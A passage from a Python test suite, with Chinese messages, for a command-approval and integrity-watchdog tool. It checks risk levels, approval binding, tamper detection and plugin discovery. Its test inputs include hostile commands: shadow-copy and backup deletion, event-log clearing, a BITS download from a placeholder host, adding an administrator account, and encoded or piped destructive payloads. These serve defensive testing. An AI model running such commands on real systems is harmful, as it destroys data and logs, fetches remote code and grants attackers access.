                   "%r 应被硬下限抬到 L3，实际 %s" % (cmd, gate["required_level"]))
            expect(gate["allowed"] is False,
                   "%r 命中白名单也不应放行，实际 reason=%s" % (cmd, gate["reason"]))
            expect(gate["reason"] == "approval_required",
                   "%r 应转审批，实际 %s" % (cmd, gate["reason"]))
            expect(gate.get("whitelist_ignored") == "^git",
                   "%r 应标注 whitelist_ignored，实际 %r"
                   % (cmd, gate.get("whitelist_ignored")))

        for cmd in ("git checkout main", "git status"):
            gate = ats.permission_gate(root, cmd, None, {"required_level": "L0"})
            expect(gate["allowed"] is True and gate["reason"] == "whitelist",
                   "安全命令 %r 应仍按白名单放行，实际 reason=%s" % (cmd, gate["reason"]))
            expect(gate.get("whitelist_ignored") is None,
                   "安全命令 %r 不应标注 whitelist_ignored" % cmd)
    finally:
        sb.cleanup()


@case
def encoded_payload_is_decoded_before_verdict():
    """编码载荷必须先解出来再判：base64 不得把危险命令洗成 L1 静默直通。"""
    sys.path.insert(0, str(REPO / "scripts"))
    import ats
    import ats_preflight

    payload = "Remove-Item -Recurse -Force C:\\temp\\x"
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()

    for flag in ("-EncodedCommand", "-enc", "-ec", "-e"):
        cmd = "powershell %s %s" % (flag, b64)
        expect(ats.derive_level(cmd) == "L3",
               "%s 应抬到 L3，实际 %s" % (flag, ats.derive_level(cmd)))
        expect(ats.hard_floor_level(cmd) == "L3",
               "%s 应有 L3 硬下限，实际 %r" % (flag, ats.hard_floor_level(cmd)))
        review = ats_preflight.static_review(cmd)
        expect("obfuscated_eval" in review["tags"],
               "%s 应标 obfuscated_eval，实际 %r" % (flag, review["tags"]))
        expect(review["confidence"] == "high",
               "%s 置信度应为 high，实际 %s" % (flag, review["confidence"]))
        expect("fs_delete" in review["tags"],
               "%s 解码后应看见 fs_delete，实际 %r" % (flag, review["tags"]))

    for cmd, why in (
            ("certutil -decode payload.b64 payload.exe", "certutil 解码"),
            ("vssadmin delete shadows /all /quiet", "删除卷影副本"),
            ("wbadmin delete catalog -quiet", "删除备份目录"),
            ("wevtutil cl System", "清空事件日志"),
            ("bitsadmin /transfer j /download http://x/a C:\\a.exe", "BITS 下载"),
            ("net localgroup administrators hacker /add", "加管理员")):
        expect(ats.floor_level("L0", cmd) == "L3",
               "%s 应抬到 L3，实际 %s" % (why, ats.floor_level("L0", cmd)))
        expect(ats.hard_floor_level(cmd) == "L3",
               "%s 应有 L3 硬下限，实际 %r" % (why, ats.hard_floor_level(cmd)))

    quoted = 'powershell -c "Remove-Item -Recurse -Force C:\\temp\\x"'
    review = ats_preflight.static_review(quoted)
    expect("fs_delete" in review["tags"],
           "引号紧贴的 Remove-Item 应出 fs_delete，实际 %r" % review["tags"])

    piped = "echo aGVsbG8= | base64 -d | bash"
    review = ats_preflight.static_review(piped)
    expect("obfuscated_eval" in review["tags"],
           "base64 -d 管道应标 obfuscated_eval，实际 %r" % review["tags"])

    benign = [
        "certutil -hashfile C:\\a.txt SHA256",
        "vssadmin list shadows",
        "wbadmin list",
        "bitsadmin /list /allusers",
        "powershell -ExecutionPolicy Bypass -File build.ps1",
        'pwsh -NoProfile -Command "Get-Date"',
        "net user",
    ]
    for cmd in benign:
        expect(ats.floor_level("L0", cmd) == "L0",
               "安全命令 %r 不应被抬高，实际 %s" % (cmd, ats.floor_level("L0", cmd)))
        review = ats_preflight.static_review(cmd)
        expect(review["confidence"] != "high",
               "只读查询 %r 不应判高置信，实际 %s（tags=%r）"
               % (cmd, review["confidence"], review["tags"]))


@case
def approval_binds_artifact_content():
    """审批必须绑脚本内容：批准后换掉 run.py 应报 artifact_changed，空格差异不算 mismatch。"""
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats

        work = sb.dir / "work"
        work.mkdir()
        script = work / "run.py"
        script.write_text("print('benign')\n", encoding="utf-8")

        ctx = {"source": "run", "task_id": "t1", "cwd": str(work)}
        rec = ats.create_approval(str(sb.root), "python run.py", "L2", ctx)
        expect(rec.get("artifacts"), "审批应记录脚本指纹，实际 %r" % rec.get("artifacts"))
        art = rec["artifacts"][0]
        expect(art.get("sha256"), "存在的脚本应有 sha256，实际 %r" % art)

        rec["status"] = "approved"
        ats.save_approval(str(sb.root), rec)

        ok = ats.approval_check(str(sb.root), rec["id"], "python run.py", ctx)
        expect(ok["ok"], "内容未变应放行，实际 %r" % ok["error"])

        spaced = ats.approval_check(str(sb.root), rec["id"], "python   run.py", ctx)
        expect(spaced["ok"], "空白差异不应判 mismatch，实际 %r" % spaced["error"])

        script.write_text("import shutil;shutil.rmtree('C:/temp/x')\n", encoding="utf-8")
        changed = ats.approval_check(str(sb.root), rec["id"], "python run.py", ctx)
        expect(changed["error"] == "artifact_changed",
               "脚本被替换应报 artifact_changed，实际 %r" % changed["error"])

        other = ats.approval_check(str(sb.root), rec["id"], "python other.py", ctx)
        expect(other["error"] == "mismatch",
               "换脚本名应报 mismatch，实际 %r" % other["error"])

        script.unlink()
        gone = ats.approval_check(str(sb.root), rec["id"], "python run.py", ctx)
        expect(gone["error"] == "artifact_changed",
               "脚本被删也应报 artifact_changed，实际 %r" % gone["error"])

        for cmd in ("echo hi", "python -c \"print(1)\"", "git status"):
            expect(not ats.artifact_digests(cmd, {"cwd": str(work)}),
                   "无脚本文件的命令不应记录指纹：%r" % cmd)
    finally:
        sb.cleanup()


@case
def hook_target_not_bound_as_artifact():
    """`@enc` 参数里的 .py 是转码目标，不是执行体：改了它不该报 artifact_changed。

    修复前 artifact_digests 把整段拼合文本按空白切词，钩子参数里的
    `data.py` 也被当成待绑定脚本 —— 转码完目标文件一变，重跑就被拦下。
    """
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats

        work = sb.dir / "work"
        work.mkdir()
        script = work / "build.py"
        target = work / "data.py"
        script.write_text("print('build')\n", encoding="utf-8")
        target.write_text("x = 1\n", encoding="utf-8")

        cmd = "python build.py @enc --from gbk --to utf-8 data.py"
        ctx = {"source": "run", "task_id": "t1", "cwd": str(work)}
        rec = ats.create_approval(str(sb.root), cmd, "L2", ctx)
        names = [Path(a["path"]).name for a in rec.get("artifacts") or []]
        expect(names == ["build.py"], "只应绑定主命令里的脚本，实际 %r" % names)

        rec["status"] = "approved"
        ats.save_approval(str(sb.root), rec)
        target.write_text("x = 2\n", encoding="utf-8")
        ok = ats.approval_check(str(sb.root), rec["id"], cmd, ctx)
        expect(ok["ok"], "转码目标变化不应拦下，实际 %r" % ok["error"])

        script.write_text("print('tampered')\n", encoding="utf-8")
        changed = ats.approval_check(str(sb.root), rec["id"], cmd, ctx)
        expect(changed["error"] == "artifact_changed",
               "主脚本被换掉仍应报 artifact_changed，实际 %r" % changed["error"])
    finally:
        sb.cleanup()


@case
def operation_level_reads_policy():
    """操作等级从 policy 读取：默认 stop=L2/delete=L3，可覆盖，非法值回落 default。"""
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats

        pol = ats.policy(str(sb.root))
        expect(ats.operation_level(pol, "stop") == "L2",
               "默认 stop 应为 L2，实际 %r" % ats.operation_level(pol, "stop"))
        expect(ats.operation_level(pol, "delete") == "L3",
               "默认 delete 应为 L3，实际 %r" % ats.operation_level(pol, "delete"))
        expect(ats.operation_level(pol, "unknown") == "L2",
               "未知操作应回落 default=L2")

        expect(ats.operation_level({"operation_levels": {"stop": "L1"}}, "stop") == "L1",
               "policy 覆盖应生效")
        expect(ats.operation_level({"operation_levels": {"stop": "L9"}}, "stop") == "L2",
               "非法等级应回落 default")
        expect(ats.operation_level({"operation_levels": {"stop": None}}, "stop", "L0") == "L0",
               "空值应回落调用方 default")
    finally:
        sb.cleanup()


@case
def operation_gate_honors_approval_mode():
    """操作闸门读 approval_mode：ask 要审批、auto 放行、deny-only 拒绝，白名单不得越上限。"""
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats

        sb.write_policy({})
        g = ats.gate_operation(str(sb.root), "L2", "stop t-1")
        expect(not g["allowed"] and g.get("error") == "approval_required",
               "默认策略下 L2 操作应要求审批，实际 %r" % g)
        expect(g.get("approval_id"), "应生成审批单号")

        sb.write_policy({"approval_mode_by_level":
                         {"L0": "auto", "L1": "auto", "L2": "auto", "L3": "auto"}})
        g = ats.gate_operation(str(sb.root), "L2", "stop t-1")
        expect(g["allowed"] and g.get("reason") == "level",
               "L2=auto 且 actor=L3 应直接放行，实际 %r" % g)

        sb.write_policy({"approval_mode_by_level": {"L2": "deny-only"}})
        g = ats.gate_operation(str(sb.root), "L2", "stop t-1")
        expect(g.get("error") == "denied_mode",
               "deny-only 应直接拒绝，实际 %r" % g)

        sb.write_policy({"allow_rules": [".*"]})
        g = ats.gate_operation(str(sb.root), "L2", "stop t-1")
        expect(not g["allowed"], "宽白名单在 ask 下不得放行，实际 %r" % g)
        expect(g.get("whitelist_ignored") == ".*",
               "应回显被忽略的白名单，实际 %r" % g.get("whitelist_ignored"))

        sb.write_policy({"max_level": "L1", "allow_rules": [".*"]})
        g = ats.gate_operation(str(sb.root), "L2", "stop t-1")
        expect(g.get("error") == "denied_policy",
               "白名单不得越过策略上限，实际 %r" % g)
    finally:
        sb.cleanup()


@case
def stop_requires_approval():
    """默认策略下 stop 是 L2/ask：无批准必须挂起，带批准后真正停止。"""
    sb = Sandbox()
    try:
        sleeper = '"%s" -c "import time; time.sleep(6)"' % sys.executable
        sb.json_out("create", "longrun", "--command", sleeper, "--level", "L0")
        sb.json_out("run", "longrun")
        time.sleep(3)

        rc, out, err = sb.ats("stop", "longrun")
        expect(rc == 4, "stop 无审批应退出 4，实际 %s\n%s%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("error") == "approval_required",
               "应报 approval_required，实际 %r" % payload.get("error"))
        expect(payload.get("level") == "L2",
               "stop 等级应为 L2，实际 %r" % payload.get("level"))
        approval_id = payload.get("approval_id")
        expect(approval_id, "应生成审批单号")

        sb.ats("approve", approval_id)
        rc, out, err = sb.ats("stop", "longrun", "--approval", approval_id)
        expect(rc == 0, "带批准后 stop 应成功，实际 %s\n%s%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("stopped"), "应返回 stopped，实际 %r" % payload)
    finally:
        sb.cleanup()


@case
def delete_requires_approval():
    """默认策略下 delete 是 L3/ask：即使任务没在运行也要审批。"""
    sb = Sandbox()
    try:
        sb.json_out("create", "todelete", "--command", "echo x", "--level", "L0")
        rc, out, err = sb.ats("delete", "todelete")
        expect(rc == 4, "delete 无审批应退出 4，实际 %s\n%s%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("error") == "approval_required",
               "应报 approval_required，实际 %r" % payload.get("error"))
        expect(payload.get("level") == "L3",
               "delete 等级应为 L3，实际 %r" % payload.get("level"))
    finally:
        sb.cleanup()


@case
def approval_id_not_reusable_across_tasks():
    """A 任务的批准单号不能用于 B 任务：应报 approval_error=mismatch。"""
    sb = Sandbox()
    try:
        sb.json_out("create", "alpha", "--command", "echo x", "--level", "L0")
        sb.json_out("create", "beta", "--command", "echo x", "--level", "L0")

        rc, out, err = sb.ats("delete", "alpha")
        expect(rc == 4, "delete alpha 应退出 4，实际 %s\n%s%s" % (rc, out, err))
        app = json.loads(out).get("approval_id")
        expect(app, "alpha 应生成审批单号")
        sb.ats("approve", app)

        rc, out, err = sb.ats("delete", "beta", "--approval", app)
        expect(rc == 4, "跨任务复用批准应被拒，实际 %s\n%s%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("approval_error") == "mismatch",
               "应报 mismatch，实际 %r" % payload.get("approval_error"))
    finally:
        sb.cleanup()


@case
def preflight_error_follows_fail_closed():
    """预检自身崩溃时：开关开→deny_injection，显式关→allow，未配置按开。"""
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats
        import ats_preflight

        sb.write_policy({})
        original = ats_preflight.static_review

        def boom(*_a, **_kw):
            raise RuntimeError("injected")

        ats_preflight.static_review = boom
        try:
            res = ats_preflight.review(str(sb.root), "echo hi", "L2",
                                       context={"source": "run"},
                                       pol={"preflight_fail_closed": True})
            expect(res.get("verdict") == "deny_injection",
                   "fail_closed=True 应判 deny_injection，实际 %r" % res.get("verdict"))
            res = ats_preflight.review(str(sb.root), "echo hi", "L2",
                                       context={"source": "run"},
                                       pol={"preflight_fail_closed": False})
            expect(res.get("verdict") == "allow",
                   "fail_closed=False 应回到 allow，实际 %r" % res.get("verdict"))
            res = ats_preflight.review(str(sb.root), "echo hi", "L2",
                                       context={"source": "run"}, pol={})
            expect(res.get("verdict") == "deny_injection",
                   "未配置时应按 fail-closed，实际 %r" % res.get("verdict"))
            res = ats.preflight_review(str(sb.root), "echo hi", "L2",
                                       {"source": "run"}, {"reason": "level"})
            expect(res and res.get("verdict") == "deny_injection",
                   "preflight_review 应 fail-closed，实际 %r" % (res,))
        finally:
            ats_preflight.static_review = original
    finally:
        sb.cleanup()


@case
def create_derives_level_when_omitted():
    """create 不传 --level 时按命令推导；显式 --level 优先。"""
    sb = Sandbox()
    try:
        rc, task = sb.json_out("create", "risky", "--command", "rm -rf /tmp/whatever")
        expect(rc == 0, "create 应成功，实际 %s" % rc)
        expect(task["task"]["level"] == "L3",
               "危险命令应推导为 L3，实际 %r" % task["task"]["level"])

        rc, task = sb.json_out("create", "plain", "--command", "echo hi")
        expect(task["task"]["level"] == "L1",
               "普通命令应回落 L1，实际 %r" % task["task"]["level"])

        rc, task = sb.json_out("create", "forced", "--command", "echo hi", "--level", "L0")
        expect(task["task"]["level"] == "L0",
               "显式 --level 应优先，实际 %r" % task["task"]["level"])
    finally:
        sb.cleanup()


# ---------------------------------------------------------------- 看门狗准入

@case
def guard_blocks_tampered_core_file():
    """清单里 ats.py 的摘要被改 → 启动即拒，命令不执行。"""
    sb = Sandbox()
    try:
        sb.ats("create", "t1", "--command", "echo hi")
        sb.auto_seal = False
        data = json.loads(sb.manifest.read_text(encoding="utf-8"))
        data["files"]["ats.py"] = "0" * 64
        sb.manifest.write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")

        rc, out, err = sb.ats("list")
        expect(rc == 4, "看门狗失败应返回 EXIT_DENIED，实际 %s\n%s\n%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("error") == "guard_check_failed",
               "应报 guard_check_failed，实际 %r" % payload.get("error"))
        stage = (payload.get("detail") or {}).get("stage")
        expect(stage == "guard_verify",
               "应停在 guard_verify 阶段，实际 %r" % stage)
    finally:
        sb.cleanup()


@case
def guard_blocks_without_manifest():
    """没有清单（未封签）时同样拒绝，不允许「默认放行」。"""
    sb = Sandbox()
    try:
        sb.auto_seal = False
        rc, out, err = sb.ats("list")
        expect(rc == 4, "无清单应返回 EXIT_DENIED，实际 %s\n%s\n%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("error") == "guard_check_failed",
               "应报 guard_check_failed，实际 %r" % payload.get("error"))
        detail = (payload.get("detail") or {}).get("detail") or {}
        expect(detail.get("error") == "manifest_missing",
               "应报 manifest_missing，实际 %r" % detail.get("error"))
    finally:
        sb.cleanup()


@case
def guard_blocks_unsealed_new_script():
    """清单之后新增的脚本属于未封签文件，必须被发现。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        scripts = sb.dir / "scripts"
        scripts.mkdir(parents=True, exist_ok=True)
        for name in ("ats.py", "ats_guard.py", "ats_preflight.py", "ats_plan.py"):
            shutil.copy2(REPO / "scripts" / name, scripts / name)
        rc, out, err = init_and_seal(sb.root, guard=scripts / "ats_guard.py")
        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
        (scripts / "evil_helper.py").write_text("print('hi')\n", encoding="utf-8")
        rc, out, err = run_script(scripts / "ats_guard.py", sb.root, "verify")
        expect(rc == 4, "未封签文件应导致 verify 失败，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        problems = payload.get("problems") or []
        expect(any(p.get("file") == "evil_helper.py" and p.get("error") == "unsealed_file"
                   for p in problems),
               "应报 evil_helper.py unsealed_file，实际 %r" % (problems,))
    finally:
        sb.cleanup()


@case
def guard_self_check_catches_tampered_watchdog():
    """看门狗自身被改 → ats.py 自检阶段就拦住，不把信任交给它。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        scripts = sb.dir / "scripts"
        scripts.mkdir(parents=True, exist_ok=True)
        for name in ("ats.py", "ats_guard.py", "ats_preflight.py", "ats_plan.py"):
            shutil.copy2(REPO / "scripts" / name, scripts / name)
        rc, out, err = init_and_seal(sb.root, guard=scripts / "ats_guard.py")
        expect(rc == 0, "封签应成功，实际 %s\n%s" % (rc, out))
        with (scripts / "ats_guard.py").open("a", encoding="utf-8") as fh:
            fh.write("\n# tampered\n")
        rc, out, err = run_script(scripts / "ats.py", sb.root, "list")
        expect(rc == 4, "篡改看门狗应返回 EXIT_DENIED，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect((payload.get("detail") or {}).get("stage") == "guard_self_check",
               "应停在 guard_self_check 阶段，实际 %r" % (payload.get("detail"),))
    finally:
        sb.cleanup()


@case
def guard_seal_requires_confirm():
    """封签会重建信任基线，缺少 --confirm 必须拒绝。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        rc, out, err = sb.guard("seal")
        expect(rc == 2, "无 --confirm 应返回 EXIT_USAGE，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("error") == "confirm_required",
               "应报 confirm_required，实际 %r" % payload.get("error"))
        expect(not sb.manifest.exists(), "被拒绝时不应落盘清单")
    finally:
        sb.cleanup()


@case
def skip_guard_requires_l3_approval():
    """--skip-guard 必须持 L3 审批：先拦、再批准、再放行。"""
    sb = Sandbox()
    try:
        rc, out, err = sb.ats("list", "--skip-guard")
        expect(rc == 4, "未审批的 --skip-guard 应被拒，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("error") == "guard_skip_approval_required",
               "应报 guard_skip_approval_required，实际 %r" % payload.get("error"))
        expect(payload.get("required_level") == "L3",
               "跳过看门狗应强制 L3，实际 %r" % payload.get("required_level"))
        approval_id = payload.get("approval_id")
        expect(approval_id, "应给出审批 id")

        rc, out, err = sb.ats("approve", approval_id)
        expect(rc == 0, "approve 应成功，实际 %s\n%s" % (rc, out))

        rc, out, err = sb.ats("policy", "--json", "--skip-guard", "--guard-approval", approval_id)
        expect(rc == 0, "持审批应放行，实际 %s\n%s\n%s" % (rc, out, err))
        json.loads(out)

        rc, out, err = sb.ats("list", "--skip-guard", "--guard-approval", "no-such-id")
        expect(rc == 4, "错误审批 id 应被拒，实际 %s\n%s" % (rc, out))
    finally:
        sb.cleanup()


@case
def skip_guard_does_not_lower_execution_level():
    """跳过看门狗不顺带降级：L1 命令也被抬到 L3，且白名单不再自动放行。"""
    sb = Sandbox()
    try:
        rc, out, err = sb.ats("run", "plain", "--skip-guard")
        payload = json.loads(out)
        skip_id = payload.get("approval_id")
        sb.ats("approve", skip_id)

        rc, task = sb.json_out("create", "plain", "--command", "echo hi")
        expect(task["task"]["level"] == "L1", "普通命令应为 L1")

        rc, out, err = sb.ats("run", "plain", "--skip-guard", "--guard-approval", skip_id)
        expect(rc == 4, "跳过看门狗后仍应要求审批，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("level") == "L3",
               "执行等级应被抬到 L3，实际 %r" % payload.get("level"))
        expect(payload.get("error") == "approval_required",
               "应要求审批，实际 %r" % payload.get("error"))
    finally:
        sb.cleanup()


@case
def guard_detects_policy_tamper_but_allows_policy_set():
    """直接改 policy.json 会被抓；走 policy --set 则自动重封签，不锁死自己。"""
    sb = Sandbox()
    try:
        rc, out, err = sb.ats("policy", "--set", "max_level", "L2", "--json")
        expect(rc == 0, "policy --set 应成功，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("max_level") == "L2",
               "策略应生效，实际 %r" % payload.get("max_level"))

        rc, out, err = sb.ats("list")
        expect(rc == 0, "改策略后应自动重封签、不再自锁，实际 %s\n%s" % (rc, out))

        sb.auto_seal = False
        policy_path = sb.root / "policy.json"
        expect(policy_path.is_file(), "policy --set 应落盘 policy.json")
        stored = json.loads(policy_path.read_text(encoding="utf-8"))
        stored["max_level"] = "L0"
        policy_path.write_text(json.dumps(stored, ensure_ascii=False), encoding="utf-8")
        rc, out, err = sb.ats("list")
        expect(rc == 4, "直接改 policy.json 应被拦，实际 %s\n%s" % (rc, out))
        problems = ((json.loads(out).get("detail") or {}).get("detail") or {}).get("problems") or []
        expect(any(p.get("file") == "policy.json" and p.get("error") == "digest_mismatch"
                   for p in problems),
               "应报 policy.json digest_mismatch，实际 %r" % (problems,))
    finally:
        sb.cleanup()


HOLD_PROBE = r'''
import json
import os
import sys

sys.dont_write_bytecode = True
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import ats

root = sys.argv[sys.argv.index("--root") + 1]
here = os.path.dirname(os.path.abspath(__file__))
res = {}

denied = ats.guard_handshake(root)
res["handshake"] = "denied" if denied is not None else "ok"
if denied is not None:
    res["payload"] = denied.get("payload")
    print(json.dumps(res, ensure_ascii=False))
    raise SystemExit(0)

res["held"] = sorted(os.path.basename(fh.name) for fh in ats.GUARD_HANDLES)

src = os.path.join(here, "ats.py")
tmp = src + ".probe.tmp"
with open(tmp, "wb") as fh:
    fh.write(b"tampered")
try:
    os.replace(tmp, src)
    res["replace"] = "OK"
except OSError as exc:
    res["replace"] = type(exc).__name__
if os.path.exists(tmp):
    os.remove(tmp)

try:
    with open(src, "rb") as fh:
        fh.read()
    res["read"] = "OK"
except OSError as exc:
    res["read"] = type(exc).__name__

res["policy_before"] = ats.policy(root).get("max_level")
pol_path = os.path.join(root, "policy.json")
with open(pol_path, encoding="utf-8") as fh:
    data = json.load(fh)
data["max_level"] = "L0"
with open(pol_path, "w", encoding="utf-8") as fh:
    fh.write(json.dumps(data))
res["policy_after"] = ats.policy(root).get("max_level")
print(json.dumps(res, ensure_ascii=False))
'''


@case
def guard_holds_handles_and_freezes_policy():
    """持句柄挡住替换但不禁读；policy 走握手快照，运行中原地改写不影响决策。

    「挡替换」只在 Windows 成立（open 不带 FILE_SHARE_DELETE）；POSIX 下 rename
    覆盖已打开文件是合法的，故那条断言按平台分流，不在别的系统上假装通过。
    """
    sb = Sandbox()
    sb.auto_seal = False
    try:
        scripts = sb.dir / "scripts"
        scripts.mkdir(parents=True, exist_ok=True)
        for name in ("ats.py", "ats_guard.py", "ats_preflight.py", "ats_plan.py"):
            shutil.copy2(REPO / "scripts" / name, scripts / name)
        probe = scripts / "_probe_hold.py"
        probe.write_text(HOLD_PROBE, encoding="utf-8")
        sb.write_policy({"max_level": "L2"})
        rc, out, err = init_and_seal(sb.root, guard=scripts / "ats_guard.py")
        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))

        rc, out, err = run_script(probe, sb.root)
        expect(rc == 0, "探测脚本应成功，实际 %s\n%s\n%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("handshake") == "ok",
               "握手应放行，实际 %r" % payload.get("handshake"))
        expect("ats.py" in payload.get("held", []),
               "应持有 ats.py 句柄，实际 %r" % payload.get("held"))
        if os.name == "nt":
            expect(payload.get("replace") != "OK",
                   "持句柄期间替换 ats.py 必须失败，实际 %r" % payload.get("replace"))
        else:
            expect(payload.get("replace") == "OK",
                   "POSIX 下 rename 覆盖已打开文件是合法的，「持句柄挡替换」这条只在 "
                   "Windows 成立；此处应观察到 OK，实际 %r" % payload.get("replace"))
        expect(payload.get("read") == "OK",
               "持句柄不应挡住读取，实际 %r" % payload.get("read"))
        expect(payload.get("policy_after") == payload.get("policy_before"),
               "运行中原地改 policy.json 不应影响本次决策，%r -> %r"
               % (payload.get("policy_before"), payload.get("policy_after"))
               )
    finally:
        sb.cleanup()


# ---------------------------------------------------------------- 扩展发现层

def write_extend(root, extend_id, entry_name="__init__.py", entry_text="# noop\n",
                 declared_id=None, **fields):
    """在 <root>/extend/<extend_id>/ 下写一个插件，返回目录。

    declared_id 用于造「目录名与 instruction.json 不一致」的用例。
    """
    base = Path(root) / "extend" / extend_id
    base.mkdir(parents=True, exist_ok=True)
    payload = {
        "extend_id": extend_id,
        "dis_name": "Demo",
        "desc": "示例插件",
        "version": "1.0.0",
        "level": "L2",
        "language": "python",
        "entry_point": entry_name,
        "commands": {"run": "--action run"},
    }
    if declared_id is not None:
        payload["extend_id"] = declared_id
    payload.update(fields)
    (base / "instruction.json").write_text(
        json.dumps(payload, ensure_ascii=False), encoding="utf-8")
    if entry_text is not None:
        (base / entry_name).write_text(entry_text, encoding="utf-8")
    return base


@case
def extend_list_states():
    """三种典型状态：合法 active、坏 JSON inactive、入口缺失 inactive。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "hello")
        base = Path(sb.root) / "extend" / "broken"
        base.mkdir(parents=True, exist_ok=True)
        (base / "instruction.json").write_text("{not json", encoding="utf-8")
        write_extend(sb.root, "noentry", entry_name="run.py", entry_text=None)

        rc, data = sb.json_out("extend", "list", "--json")
        expect(rc == 0, "extend list 应退出 0，实际 %s" % rc)
        expect(data["count"] == 3, "应发现 3 个插件，实际 %s" % data["count"])
        by_id = {x["extend_id"]: x for x in data["extends"]}
        expect(by_id["hello"]["state"] == "active",
               "hello 应为 active，实际 %r" % by_id["hello"]["state"])
        expect(by_id["broken"]["reason"] == "missing_or_invalid_instruction",
               "坏 JSON 应报 missing_or_invalid_instruction，实际 %r"
               % by_id["broken"]["reason"])
        expect(by_id["noentry"]["reason"] == "missing_entry_point",
               "缺入口应报 missing_entry_point，实际 %r"
               % by_id["noentry"]["reason"])
        expect(data["active"] == 1 and data["inactive"] == 2,
               "计数应为 1 active / 2 inactive，实际 %s / %s"
               % (data["active"], data["inactive"]))
    finally:
        sb.cleanup()


@case
def extend_list_empty_dir():
    """extend 目录不存在时返回空结果，不报错。"""
    sb = Sandbox()
    try:
        rc, data = sb.json_out("extend", "list", "--json")
        expect(rc == 0, "无 extend 目录也应退出 0，实际 %s" % rc)
        expect(data["count"] == 0, "应为 0 个插件，实际 %s" % data["count"])
        expect(data["extends"] == [], "extends 应为空列表")
    finally:
        sb.cleanup()


@case
def extend_never_executes():
    """发现层不导入插件：入口文件里的导入副作用不得发生。"""
    sb = Sandbox()
    try:
        marker = Path(sb.root) / "executed.marker"
        write_extend(
            sb.root, "sideeffect",
            entry_text="import pathlib\npathlib.Path(%r).write_text('boom')\n" % str(marker),
        )
        rc, data = sb.json_out("extend", "list", "--json")
        expect(rc == 0, "extend list 应退出 0，实际 %s" % rc)
        expect(not marker.exists(),
               "extend list 不得执行插件代码，但入口副作用已发生：%s" % marker)

        rc, data = sb.json_out("extend", "help", "sideeffect", "--json")
        expect(rc == 0, "extend help 应退出 0，实际 %s" % rc)
        expect(not marker.exists(),
               "extend help 不得执行插件代码，但入口副作用已发生：%s" % marker)
    finally:
        sb.cleanup()


@case
def extend_level_floor():
    """声明等级不被当真：低于 L2 抬到 L2，缺失或非法按 L3。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "low", level="L0")
        write_extend(sb.root, "high", level="L3")
        write_extend(sb.root, "badlevel", level="L9")
        write_extend(sb.root, "nolevel", level="")

        rc, data = sb.json_out("extend", "list", "--json")
        expect(rc == 0, "extend list 应退出 0，实际 %s" % rc)
        by_id = {x["extend_id"]: x for x in data["extends"]}
        expect(by_id["low"]["level"] == "L2" and by_id["low"]["level_note"] == "raised_to_floor",
               "L0 应抬到 L2，实际 %r / %r"
               % (by_id["low"]["level"], by_id["low"]["level_note"]))
        expect(by_id["high"]["level"] == "L3" and by_id["high"]["level_note"] is None,
               "L3 应原样保留，实际 %r / %r"
               % (by_id["high"]["level"], by_id["high"]["level_note"]))
        for name in ("badlevel", "nolevel"):
            expect(by_id[name]["level"] == "L3",
                   "%s 应覆写为 L3，实际 %r" % (name, by_id[name]["level"]))
            expect(by_id[name]["level_note"] == "missing_or_invalid_level",
                   "%s 应标 missing_or_invalid_level，实际 %r"
                   % (name, by_id[name]["level_note"]))
            expect(by_id[name]["state"] == "active",
                   "%s 等级非法只覆写等级，不因此判 inactive，实际 %r"
                   % (name, by_id[name]["state"]))
    finally:
        sb.cleanup()


@case
def extend_id_mismatch_and_bad_name():
    """目录名与 extend_id 不一致、目录名非法，都必须判 inactive。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "folder_a", declared_id="other_id")
        base = Path(sb.root) / "extend" / "bad name"
        base.mkdir(parents=True, exist_ok=True)
        (base / "instruction.json").write_text(
            json.dumps({"extend_id": "bad name", "dis_name": "x", "desc": "x",
                        "version": "1", "level": "L2", "language": "python",
                        "entry_point": "__init__.py", "commands": {"a": "b"}}),
            encoding="utf-8")
        (base / "__init__.py").write_text("# noop\n", encoding="utf-8")

        rc, data = sb.json_out("extend", "list", "--json")
        expect(rc == 0, "extend list 应退出 0，实际 %s" % rc)
        by_id = {x["extend_id"]: x for x in data["extends"]}
        expect(by_id["folder_a"]["reason"] == "extend_id_mismatch",
               "id 不一致应报 extend_id_mismatch，实际 %r"
               % by_id["folder_a"]["reason"])
        expect(by_id["bad name"]["reason"] == "bad_extend_id",
               "非法目录名应报 bad_extend_id，实际 %r" % by_id["bad name"]["reason"])
        expect(by_id["bad name"]["state"] == "inactive", "非法目录名应为 inactive")
    finally:
        sb.cleanup()


@case
def extend_help_and_not_found():
    """help 返回说明与指令；未知 id 返回 not_found 且退出码 3。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "hello", dis_name="Hello", desc="打招呼",
                     commands={"greet": "--name x", "echo": "--text y"})

        rc, data = sb.json_out("extend", "help", "hello", "--json")
        expect(rc == 0, "extend help 应退出 0，实际 %s" % rc)
